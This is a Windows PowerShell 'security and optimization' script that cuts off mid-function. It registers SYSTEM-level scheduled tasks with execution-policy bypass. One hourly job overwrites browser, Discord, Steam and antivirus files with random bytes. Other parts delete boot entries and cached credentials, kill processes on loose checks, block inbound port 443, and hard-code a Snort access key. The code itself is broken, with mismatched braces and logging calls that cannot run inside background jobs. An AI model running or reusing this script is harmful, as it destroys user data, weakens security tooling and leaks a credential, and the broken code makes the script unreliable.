#Requires -RunAsAdministrator
# GSecurity.ps1
# Consolidated Windows security and optimization script
# Author: Gorstak, optimized by Grok
# Description: Comprehensive script for securing and optimizing Windows systems, including web server and VM termination

param (
    [switch]$Monitor,
    [switch]$Backup,
    [switch]$ResetPassword,
    [switch]$Start,
    [string]$SnortOinkcode = "6cc50dfad45e71e9d8af44485f59af2144ad9a3c",
    [switch]$DebugMode,
    [switch]$NoMonitor,
    [string]$ConfigPath = "$env:USERPROFILE\GSecurity_config.json"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$Global:ExitCode = 0
$Global:LogDir = "$env:TEMP\security_rules\logs"
$Global:LogFile = "$Global:LogDir\GSecurity_$(Get-Date -Format 'yyyyMMdd').log"

# Configuration
$Global:Config = @{
    CookieMonitor = @{
        TaskScriptPath = "C:\Windows\Setup\Scripts\Bin\CookieMonitor.ps1"
        LogDir = "C:\logs"
        BackupDir = "$env:ProgramData\CookieBackup"
        CookieLogPath = "$env:ProgramData\CookieBackup\CookieMonitor.log"
        PasswordLogPath = "$env:ProgramData\CookieBackup\NewPassword.log"
        ErrorLogPath = "$Global:LogDir\ScriptErrors.log"
        CookiePath = "$env:LocalAppData\Google\Chrome\User Data\Default\Cookies"
        BackupPath = "$env:ProgramData\CookieBackup\Cookies.bak"
    }
    Sources = @{
        YaraForge = "https://api.github.com/repos/YARAHQ/yara-forge/releases"
        YaraRules = "https://github.com/Yara-Rules/rules/archive/refs/heads/master.zip"
        SigmaHQ = "https://github.com/SigmaHQ/sigma/archive/master.zip"
        EmergingThreats = "https://rules.emergingthreats.net/open/snort-3.0.0/emerging.rules.tar.gz"
        SnortCommunity = "https://www.snort.org/downloads/community/community-rules.tar.gz"
    }
    ExcludedSystemFiles = @(
        "svchost.exe", "lsass.exe", "cmd.exe", "explorer.exe", "winlogon.exe",
        "csrss.exe", "services.exe", "msiexec.exe", "conhost.exe", "dllhost.exe",
        "WmiPrvSE.exe", "MsMpEng.exe", "TrustedInstaller.exe", "spoolsv.exe", "LogonUI.exe"
    )
    Telemetry = @{
        Enabled = $true
        MaxEvents = 1000
        Path = "$env:TEMP\security_rules\telemetry.json"
    }
    RetrySettings = @{
        MaxRetries = 3
        RetryDelaySeconds = 5
    }
}

# Logging Function
function Write-Log {
    param (
        [string]$Message,
        [string]$EntryType = "Information"
    )
    $maxEventLogLength = 32766
    if (-not (Test-Path $Global:LogDir)) {
        New-Item -ItemType Directory -Path $Global:LogDir -Force | Out-Null
    }
    
    $truncatedMessage = if ($Message.Length -gt $maxEventLogLength) {
        $Message.Substring(0, $maxEventLogLength - 100) + "... [Truncated, see log file]"
    } else {
        $Message
    }
    
    $color = switch ($EntryType) {
        "Error" { "Red" }
        "Warning" { "Yellow" }
        default { "White" }
    }
    Write-Host "[$EntryType] $truncatedMessage" -ForegroundColor $color
    
    $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$EntryType] $Message"
    $logEntry | Out-File -FilePath $Global:LogFile -Append -Encoding UTF8
    
    try {
        Write-EventLog -LogName "Application" -Source "GSecurity" -EventId 1000 -EntryType $EntryType -Message $truncatedMessage -ErrorAction Stop
    } catch {
        $errorMsg = "Failed to write to Event Log: $_"
        $errorMsg | Out-File -FilePath $Global:LogFile -Append -Encoding UTF8
    }
}

# Exit Handler
function Exit-Script {
    param (
        [int]$ExitCode = 0,
        [string]$Message = ""
    )
    if ($Message) {
        Write-Log $Message -EntryType $(if ($ExitCode -ne 0) { "Error" } else { "Information" })
    }
    exit $ExitCode
}

# Initialize Event Log
function Initialize-EventLog {
    if (-not [System.Diagnostics.EventLog]::SourceExists("GSecurity")) {
        New-EventLog -LogName "Application" -Source "GSecurity"
        Write-Log "Created Event Log source: GSecurity"
    }
}

# Register Scheduled Task
function Register-ScheduledTask {
    param (
        [Parameter(Mandatory=$true)]
        [string]$TaskName,
        [Parameter(Mandatory=$true)]
        [string]$ScriptPath,
        [string]$Arguments = "",
        [switch]$AtLogon,
        [switch]$AtStartup,
        [string]$EventQuery
    )
    try {
        if ([string]::IsNullOrEmpty($ScriptPath)) {
            throw "ScriptPath cannot be empty."
        }
        if (-not (Test-Path (Split-Path $ScriptPath -Parent))) {
            New-Item -Path (Split-Path $ScriptPath -Parent) -ItemType Directory -Force | Out-Null
            Write-Log "Created folder: $(Split-Path $ScriptPath -Parent)"
        }
        
        Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force -ErrorAction Stop
        Write-Log "Copied script to: $ScriptPath"
        
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        
        $taskService = New-Object -ComObject Schedule.Service
        $taskService.Connect()
        $taskDefinition = $taskService.NewTask(0)
        $taskDefinition.Principal.UserId = "SYSTEM"
        $taskDefinition.Principal.LogonType = 5 # ServiceAccount
        $taskDefinition.Principal.RunLevel = 1 # Highest
        $taskDefinition.Settings.Enabled = $true
        $taskDefinition.Settings.AllowDemandStart = $true
        $taskDefinition.Settings.StartWhenAvailable = $true
        
        if ($AtLogon) {
            $trigger = $taskDefinition.Triggers.Create(3) # Logon trigger
        } elseif ($AtStartup) {
            $trigger = $taskDefinition.Triggers.Create(8) # Startup trigger
        } elseif ($EventQuery) {
            $trigger = $taskDefinition.Triggers.Create(0) # Event trigger
            $trigger.Subscription = $EventQuery
        } else {
            throw "No valid trigger specified."
        }
        $trigger.Enabled = $true
        
        $action = $taskDefinition.Actions.Create(0) # Exec action
        $action.Path = "powershell.exe"
        $action.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" $Arguments"
        
        $taskService.GetFolder("\").RegisterTaskDefinition($TaskName, $taskDefinition, 6, "SYSTEM", $null, 5)
        Write-Log "Registered task: $TaskName"
    } catch {
        Write-Log "Failed to register task ${TaskName}: $($_.ToString())" -EntryType "Error"
        $Global:ExitCode = 1
    }
}

# Audio Enhancements
function Invoke-AudioEnhancements {
    function Take-RegistryOwnership {
        param ([string]$RegPath)
        try {
            $regKeyPath = "HKLM:\$RegPath"
            if (-not (Test-Path $regKeyPath)) {
                Write-Log "Registry path $RegPath does not exist" -EntryType "Warning"
                return $false
            }
            $acl = Get-Acl -Path $regKeyPath -ErrorAction Stop
            $admin = New-Object System.Security.Principal.NTAccount("Administrators")
            $acl.SetOwner($admin)
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($admin, "FullControl", "Allow")
            $acl.AddAccessRule($rule)
            Set-Acl -Path $regKeyPath -AclObject $acl -ErrorAction Stop
            Write-Log "Took ownership of $RegPath"
            return $true
        } catch {
            Write-Log "Failed to take ownership of ${RegPath}: $_" -EntryType "Warning"
            return $false
        }
    }

    $renderDevicesKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"
    try {
        if (-not (Test-Path $renderDevicesKey)) {
            Write-Log "No audio render devices found." -EntryType "Warning"
            return
        }
        $audioDevices = Get-ChildItem -Path $renderDevicesKey -ErrorAction Stop
        foreach ($device in $audioDevices) {
            $fxPropertiesKey = "$($device.PSPath)\FxProperties"
            if (-not (Test-Path $fxPropertiesKey)) {
                Write-Log "FxProperties key not found for device: $($device.PSChildName)" -EntryType "Warning"
                continue
            }
            if (-not (Take-RegistryOwnership -RegPath ($fxPropertiesKey -replace 'HKEY_LOCAL_MACHINE\\', ''))) {
                Write-Log "Skipping device $($device.PSChildName) due to ownership failure" -EntryType "Warning"
                continue
            }

            $aecKey = "{1c7b1faf-caa2-451b-b0a4-87b19a93556a},6"
            $noiseSuppressionKey = "{e0f158e1-cb04-43d5-b6cc-3eb27e4db2a1},3"
            $enableValue = 1

            foreach ($key in @($aecKey, $noiseSuppressionKey)) {
                $settingName = if ($key -eq $aecKey) { "Acoustic Echo Cancellation" } else { "Noise Suppression" }
                try {
                    if ((Get-ItemProperty -Path $fxPropertiesKey -Name $key -ErrorAction SilentlyContinue).$key -ne $enableValue) {
                        Set-ItemProperty -Path $fxPropertiesKey -Name $key -Value $enableValue -ErrorAction Stop
                        Write-Log "$settingName enabled for device: $($device.PSChildName)"
                    } else {
                        Write-Log "$settingName already enabled for device: $($device.PSChildName)"
                    }
                } catch {
                    Write-Log "Failed to enable $settingName for device $($device.PSChildName): $_" -EntryType "Warning"
                }
            }
        }
    } catch {
        Write-Log "Error processing audio devices: $_" -EntryType "Error"
    }
}

# BCD Cleanup
function Invoke-BCDCleanup {
    $BackupPath = "C:\BCD_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').bcd"
    Write-Log "Creating BCD backup at $BackupPath"
    try {
        & bcdedit /export $BackupPath | Out-Null
        Write-Log "BCD backup created successfully."
    } catch {
        Write-Log "Error creating BCD backup: $_" -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    Write-Log "Enumerating BCD entries..."
    $BcdOutput = & bcdedit /enum all
    if (-not $BcdOutput) {
        Write-Log "Failed to enumerate BCD entries." -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    $BcdEntries = @()
    $currentEntry = $null
    foreach ($line in $BcdOutput) {
        if ($line -match '^identifier\s+(\{[0-9a-fA-F\-]{36}|\{[^\}]+\})') {
    if ($currentEntry) { $BcdEntries += $currentEntry }
    $currentEntry = [PSCustomObject]@{
        Identifier = $Matches[1]
        Properties = @{}
    }
}
        } elseif ($line -match "^(\w+)\s+(.+)$") {
            if ($currentEntry) { $currentEntry.Properties[$Matches[1]] = $Matches[2] }
        }
    }
    if ($currentEntry) { $BcdEntries += $currentEntry }
    
    $CriticalIds = @("{bootmgr}", "{current}", "{default}")
    $LegitimatePaths = @("\\windows\\system32\\winload.efi", "\\windows\\system32\\winresume.efi")
    $SuspiciousEntries = @()
    foreach ($entry in $BcdEntries) {
        if ($entry.Identifier -in $CriticalIds) { continue }
        $isSuspicious = $false
        $reason = ""
        
        if ($entry.Properties.description -and $entry.Properties.description -notmatch "Windows") {
            $isSuspicious = $true
            $reason += "Non-Windows description: $($entry.Properties.description); "
        }
        if ($entry.Properties.device -match "vhd=") {
            $isSuspicious = $true
            $reason += "Uses VHD device: $($entry.Properties.device); "
        }
        if ($entry.Properties.path -and $entry.Properties.path -notmatch ($LegitimatePaths -join "|")) {
            $isSuspicious = $true
            $reason += "Non-standard boot path: $($entry.Properties.path); "
        }
        
        if ($isSuspicious) {
            $SuspiciousEntries += [PSCustomObject]@{
                Identifier = $entry.Identifier
                Description = $entry.Properties.description
                Device = $entry.Properties.device
                Path = $entry.Properties.path
                Reason = $reason
            }
        }
    }
    
    if ($SuspiciousEntries.Count -eq 0) {
        Write-Log "No suspicious BCD entries found."
    } else {
        foreach ($entry in $SuspiciousEntries) {
            Write-Log "Suspicious entry: $($entry.Identifier) - $($entry.Reason)"
            try {
                & bcdedit /delete $entry.Identifier /f | Out-Null
                Write-Log "Deleted entry: $($entry.Identifier)"
            } catch {
                Write-Log "Error deleting entry $($entry.Identifier): $_" -EntryType "Error"
                $Global:ExitCode = 1
            }
        }
    }

# Browser Security
function Invoke-BrowserSecurity {
    $desiredSettings = @{
        "media_stream" = 2
        "webrtc" = 2
        "remote" = @{ "enabled" = $false; "support" = $false }
    }
    
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable"
    }
    
    foreach ($browser in $browsers.GetEnumerator()) {
        if (-not (Test-Path $browser.Value)) {
            Write-Log "$($browser.Key): Profile path not found. Skipping." -EntryType "Information"
            continue
        }
        $prefsPath = "$($browser.Value)\Preferences"
        if (-not (Test-Path $prefsPath)) {
            Write-Log "$($browser.Key): Preferences file not found at $prefsPath. Skipping." -EntryType "Information"
            continue
        }
        try {
            $prefsContent = Get-Content -Path $prefsPath -Raw | ConvertFrom-Json
            $settingsChanged = $false
            
            if (-not $prefsContent.profile) { $prefsContent | Add-Member -MemberType NoteProperty -Name profile -Value @{} }
            if (-not $prefsContent.profile["default_content_setting_values"]) {
                $prefsContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
            }
            foreach ($key in $desiredSettings.Keys.Where({ $_ -ne "remote" })) {
                if ($prefsContent.profile["default_content_setting_values"][$key] -ne $desiredSettings[$key]) {
                    $prefsContent.profile["default_content_setting_values"][$key] = $desiredSettings[$key]
                    $settingsChanged = $true
                }
            }
            
            if (-not $prefsContent.remote) { $prefsContent | Add-Member -MemberType NoteProperty -Name remote -Value @{} }
            foreach ($key in $desiredSettings["remote"].Keys) {
                if ($prefsContent.remote[$key] -ne $desiredSettings["remote"][$key]) {
                    $prefsContent.remote[$key] = $desiredSettings["remote"][$key]
                    $settingsChanged = $true
                }
            }
            
            if ($settingsChanged) {
                $prefsContent | ConvertTo-Json -Compress | Set-Content -Path $prefsPath
                Write-Log "$($browser.Key): Updated WebRTC and remote settings."
            }
            
            if ($prefsContent.plugins) {
                foreach ($plugin in $prefsContent.plugins) {
                    $plugin.enabled = $false
                }
                Write-Log "$($browser.Key): Plugins disabled."
            }
        } catch {
            Write-Log "Error updating $($browser.Key) settings: $_" -EntryType "Error"
        }
    }
    
    # Firefox configuration
    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfilePath) {
        $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
        foreach ($profile in $firefoxProfiles) {
            $prefsJsPath = "$($profile.FullName)\prefs.js"
            $pluginRegPath = "$($profile.FullName)\pluginreg.dat"
            
            if (Test-Path $prefsJsPath) {
                Copy-Item -Path $prefsJsPath -Destination "$prefsJsPath.bak" -Force
                $prefsJsContent = Get-Content -Path $prefsJsPath
                if ($prefsJsContent -notmatch 'user_pref\("media.peerconnection.enabled", false\)') {
                    Add-Content -Path $prefsJsPath 'user_pref("media.peerconnection.enabled", false);'
                    Write-Log "Firefox profile $($profile.FullName): WebRTC disabled."
                }
            }
            
            if (Test-Path $pluginRegPath) {
                Clear-Content -Path $pluginRegPath
                Write-Log "Firefox profile $($profile.FullName): Plugins disabled."
            }
        }
    }
    
    # Chrome Remote Desktop
    $serviceName = "chrome-remote-desktop-host"
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $serviceName -Force
        Set-Service -Name $serviceName -StartupType Disabled
        Write-Log "Chrome Remote Desktop service stopped and disabled."
    }
    
    $ruleName = "Block CRD Ports"
    if (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue) {
        Remove-NetFirewallRule -DisplayName $ruleName
    }
    New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort 443 -Action Block -Profile Any -Enabled "True"
    Write-Log "Firewall rule created to block Chrome Remote Desktop."
}

# Credential Protection
function Invoke-CredentialProtection {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord -ErrorAction Stop
        Write-Log "LSASS configured as Protected Process Light."
    } catch {
        Write-Log "Failed to enable LSASS PPL: $_" -EntryType "Error"
    }
    
    try {
        $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
        if (Test-Path $cmdkeyPath) {
            & $cmdkeyPath /list | ForEach-Object {
                if ($_ -match "Target:") {
                    $target = $_ -replace ".*Target: (.*)", '$1'
                    & $cmdkeyPath /delete:$target
                }
            }
            Write-Log "Cleared cached credentials."
        } else {
            Write-Log "cmdkey.exe not found at $cmdkeyPath. Skipping credential cleanup." -EntryType "Warning"
        }
    } catch {
        Write-Log "Failed to clear credentials: $_" -EntryType "Error"
    }
    
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -Value 0 -Type String -ErrorAction Stop
        Write-Log "Disabled credential caching."
    } catch {
        Write-Log "Failed to disable credential caching: $_" -EntryType "Error"
    }
    
    try {
        auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
        Write-Log "Enabled credential validation auditing."
    } catch {
        Write-Log "Failed to enable auditing: $_" -EntryType "Error"
    }
}

# Telemetry Corruption
function Invoke-TelemetryCorruption {
    $TargetFiles = @(
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl",
        "$env:LocalAppData\Microsoft\Windows\WebCache\WebCacheV01.dat",
        "$env:ProgramData\Microsoft\Windows\AppRepository\StateRepository-Deployment.srd",
        "$env:ProgramData\Microsoft\Diagnosis\eventTranscript\eventTranscript.db",
        "$env:LocalAppData\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log",
        "$env:LocalAppData\Google\Chrome\User Data\EventLog\*.etl",
        "$env:LocalAppData\Microsoft\Edge\User Data\Default\Preferences",
        "$env:ProgramData\NVIDIA Corporation\NvTelemetry\NvTelemetryContainer.etl",
        "$env:ProgramFiles\NVIDIA Corporation\NvContainer\NvContainerTelemetry.etl",
        "$env:ProgramFiles(x86)\Google\Update\GoogleUpdate.log",
        "$env:ProgramData\Adobe\ARM\log\ARMTelemetry.etl",
        "$env:LocalAppData\Adobe\Creative Cloud\ACC\logs\CoreSync.log",
        "$env:ProgramFiles\Common Files\Adobe\OOBE\PDApp.log",
        "$env:ProgramData\Intel\Telemetry\IntelData.etl",
        "$env:ProgramFiles\Intel\Driver Store\Telemetry\IntelGFX.etl",
        "$env:ProgramData\AMD\CN\AMDDiag.etl",
        "$env:LocalAppData\AMD\CN\logs\RadeonSoftware.log",
        "$env:ProgramFiles\AMD\CNext\CNext\AMDTel.db",
        "$env:ProgramFiles(x86)\Steam\logs\perf.log",
        "$env:LocalAppData\Steam\htmlcache\Cookies",
        "$env:ProgramData\Steam\SteamAnalytics.etl",
        "$env:ProgramData\Epic\EpicGamesLauncher\Data\EOSAnalytics.etl",
        "$env:LocalAppData\EpicGamesLauncher\Saved\Logs\EpicGamesLauncher.log",
        "$env:LocalAppData\Discord\app-*\modules\discord_analytics\*.log",
        "$env:AppData\Discord\Local Storage\leveldb\*.ldb",
        "$env:LocalAppData\Autodesk\Autodesk Desktop App\Logs\AdskDesktopAnalytics.log",
        "$env:ProgramData\Autodesk\Adlm\Telemetry\AdlmTelemetry.etl",
        "$env:LocalAppData\Logitech\LogiOptions\logs\LogiAnalytics.log",
        "$env:ProgramData\Logitech\LogiSync\Telemetry.etl",
        "$env:ProgramData\Razer\Synapse3\Logs\RazerSynapse.log",
        "$env:LocalAppData\Razer\Synapse\Telemetry\RazerTelemetry.etl",
        "$env:ProgramData\Corsair\CUE\logs\iCUETelemetry.log",
        "$env:LocalAppData\Corsair\iCUE\Analytics\*.etl",
        "$env:ProgramData\Kaspersky Lab\AVP*\logs\Telemetry.etl",
        "$env:ProgramData\McAfee\Agent\logs\McTelemetry.log",
        "$env:ProgramData\Norton\Norton\Logs\NortonAnalytics.etl",
        "$env:ProgramFiles\Bitdefender\Bitdefender Security\logs\BDTelemetry.db",
        "$env:LocalAppData\Slack\logs\SlackAnalytics.log",
        "$env:ProgramData\Dropbox\client\logs\DropboxTelemetry.etl",
        "$env:LocalAppData\Zoom\logs\ZoomAnalytics.log"
    )
    
    Start-Job -ScriptBlock {
        param ($Files)
        function Overwrite-File {
            param ($FilePath)
            try {
                if (Test-Path $FilePath) {
                    $Size = (Get-Item $FilePath).Length
                    $Junk = [byte[]]::new($Size)
                    (New-Object System.Random).NextBytes($Junk)
                    [System.IO.File]::WriteAllBytes($FilePath, $Junk)
                    Write-Log "Overwrote telemetry file: $FilePath"
                }
            } catch {
                Write-Log "Error overwriting ${FilePath}: $_" -EntryType "Error"
            }
        }
        
        while ($true) {
            $StartTime = Get-Date
            foreach ($File in $Files) {
                if ($File -match '\*') {
                    Get-Item -Path $File -ErrorAction SilentlyContinue | ForEach-Object { Overwrite-File -FilePath $_.FullName }
                } else {
                    Overwrite-File -FilePath $File
                }
            }
            $ElapsedSeconds = ((Get-Date) - $StartTime).TotalSeconds
            $SleepSeconds = [math]::Max(3600 - $ElapsedSeconds, 0)
            Start-Sleep -Seconds $SleepSeconds
        }
    } -ArgumentList $TargetFiles
    Write-Log "Started telemetry corruption job."
}

# Suspicious File Removal
function Invoke-SuspiciousFileRemoval {
    Start-Job -ScriptBlock {
        while ($true) {
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DriveType -in @('Fixed', 'Removable', 'Network') }
            foreach ($drive in $drives) {
                $files = Get-ChildItem -Path $drive.Root -Recurse -File -ErrorAction SilentlyContinue
                $processes = Get-WmiObject Win32_Process | Where-Object {
                    $processPath = $_.ExecutablePath
                    if ($processPath) { $files | Where-Object { $_.FullName -eq $processPath } }
                }
                
                foreach ($process in $processes) {
                    if ($process.Name -eq "Unknown" -or $process.Name -eq "N/A" -or $process.Name -eq "" -or ($process.ExecutablePath -and -not (Test-Path $process.ExecutablePath))) {
                        if ($process.ProcessId) {
                            Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
                            Write-Log "Terminated suspicious process: $($process.Name)"
                        }
                    }
                }
            }
            Start-Sleep -Seconds 120
        }
    }
    Write-Log "Started suspicious file removal job."
}

# Device Filtering
function Invoke-DeviceFiltering {
    $scriptDir = Split-Path -Parent $PSCommandPath
    $setAclPath = Join-Path $scriptDir "SetACL.exe"
    
    if (-not (Test-Path $setAclPath)) {
        Write-Log "SetACL.exe not found in $scriptDir" -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    Write-Log "Listing all devices..."
    $devices = Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.DeviceID -ne $null } | Select-Object Name, DeviceID
    
    $consoleLogonGroup = "S-1-2-1"
    foreach ($device in $devices) {
        $deviceId = $device.DeviceID
        Write-Log "Setting permissions for device: $($device.Name) ($deviceId)"
        try {
            & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np" -ace "n:$consoleLogonGroup;p:full"
            & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np"
            & $setAclPath -on $deviceId -ot reg -actn rstchldrn -rst "dacl,sacl"
            Write-Log "Permissions updated for $deviceId"
        } catch {
            Write-Log "Error setting permissions for ${deviceId}: $_" -EntryType "Error"
        }
    }
}

# Performance Tweaks
function Invoke-PerformanceTweaks {
    function Set-RegKey {
        param ([string]$Path, [string]$Name, $Value, [string]$ValueType = "DWord")
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        if ($ValueType -eq "DWord") {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force -ErrorAction SilentlyContinue
        } else {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type String -Force -ErrorAction SilentlyContinue
        }
    }
    
    try {
        bcdedit /set disabledynamictick yes | Out-Null
        bcdedit /set quietboot yes | Out-Null
        powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100 | Out-Null
        powercfg -setactive scheme_current | Out-Null
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DistributeTimers" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "IoPageLockLimit" -Value 0x400000
        netsh.exe interface tcp set supplemental Internet congestionprovider=ctcp | Out-Null
        netsh.exe interface tcp set global fastopen=enabled | Out-Null
        netsh.exe interface tcp set global rss=enabled | Out-Null
        Set-NetTCPSetting -SettingName * -MaxSynRetransmissions 2 -ErrorAction SilentlyContinue
        Disable-NetAdapterPowerManagement -Name * -ErrorAction SilentlyContinue
        Disable-NetAdapterLso -Name * -ErrorAction SilentlyContinue
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "Tcp1323Opts" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "MaxUserPort" -Value 65534
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "TcpTimedWaitDelay" -Value 30
        
        $tcpipPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
        Get-ChildItem -Path $tcpipPath -ErrorAction SilentlyContinue | ForEach-Object {
            Set-RegKey -Path $_.PSPath -Name "TCPNoDelay" -Value 1
            Set-RegKey -Path $_.PSPath -Name "TcpAckFrequency" -Value 1
        }
        
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultReceiveWindow" -Value 33178
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultSendWindow" -Value 33178
        powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
        Set-RegKey -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "FolderContentsInfoTip" -Value 1
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 0
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSecondsInSystemClock" -Value 1
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "DragFullWindows" -Value "1" -ValueType "String"
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "FontSmoothing" -Value "2" -ValueType "String"
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "FontSmoothingType" -Value 2
        Set-RegKey -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "SystemResponsiveness" -Value 0
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" -Name "VisualFXSetting" -Value 3
        
        $services = @("Spooler", "WSearch")
        foreach ($service in $services) {
            if ((Get-Service -Name $service -ErrorAction SilentlyContinue).StartType -ne "Disabled") {
                Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
                Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            }
        }
        
        $servicesPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
        Get-ChildItem -Path $servicesPath -ErrorAction SilentlyContinue | ForEach-Object {
            Set-RegKey -Path $_.PSPath -Name "SvcHostSplitDisable" -Value 1
        }
        
        try {
            Enable-WindowsOptionalFeature -Online -FeatureName "DirectPlay" -NoRestart -ErrorAction Stop
        } catch {
            Write-Log "Failed to enable DirectPlay: $_" -EntryType "Warning"
        }
        
        $bloatFeatures = @("TFTP", "TelnetClient", "SimpleTCP")
        foreach ($feature in $bloatFeatures) {
            if ((Get-WindowsOptionalFeature -Online -FeatureName $feature -ErrorAction SilentlyContinue).State -eq 'Enabled') {
                Disable-WindowsOptionalFeature -Online -FeatureName $feature -NoRestart -ErrorAction SilentlyContinue
            }
        }
        
        $bloatCaps = @("*InternetExplorer*", "*WindowsMediaPlayer*")
        foreach ($cap in $bloatCaps) {
            $capsToRemove = Get-WindowsCapability -Online | Where-Object { $_.Name -like $cap -and $_.State -eq 'Installed' }
            foreach ($capToRemove in $capsToRemove) {
                Remove-WindowsCapability -Online -Name $capToRemove.Name -ErrorAction SilentlyContinue
            }
        }
        
        $os = Get-CimInstance -ClassName Win32_OperatingSystem
        $ram = $os.TotalVisibleMemorySize + 1048576
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control" -Name "SvcHostSplitThresholdInKB" -Value $ram
        Write-Log "Applied performance tweaks."
    } catch {
        Write-Log "Error applying performance tweaks: $_" -EntryType "Error"
    }
}

# Security Rules
# Validate URL accessibility with retry
function Test-Url {
    param (
        [string]$Uri,
        [int]$MaxRetries = 3,
        [int]$InitialDelay = 2
    )
    
    $attempt = 0
    $delay = $InitialDelay
    
    while ($attempt -lt $MaxRetries) {
        try {
            $response = Invoke-WebRequest -Uri $Uri -Method Head -UseBasicParsing -TimeoutSec 10
            return $response.StatusCode -eq 200
        }
        catch {
            $attempt++
            Write-Log "URL validation failed for ${Uri}: $_ (Status: $($_.Exception.Response.StatusCode))" -EntryType "Warning"
            
            if ($attempt -ge $MaxRetries) {
                return $false
            }
            
            # Exponential backoff
            Start-Sleep -Seconds $delay
            $delay *= 2
        }
    }
    return $false
}

# Check if rule source has been updated
function Test-RuleSourceUpdated {
    param (
        [string]$Uri,
        [string]$LocalFile,
        [int]$MaxRetries = 3
    )
    
    $attempt = 0
    $delay = 2
    
    while ($attempt -lt $MaxRetries) {
        try {
            Write-Log "Checking update for ${Uri}..."
            $webRequest = Invoke-WebRequest -Uri $Uri -Method Head -UseBasicParsing -TimeoutSec 15
            $lastModified = $webRequest.Headers['Last-Modified']
            
            if ($lastModified) {
                $lastModifiedDate = [DateTime]::Parse($lastModified)
                if (Test-Path $LocalFile) {
                    $fileLastModified = (Get-Item $LocalFile).LastWriteTime
                    return $lastModifiedDate -gt $fileLastModified
                }
                return $true
            }
            return $true
        }
        catch {
            $attempt++
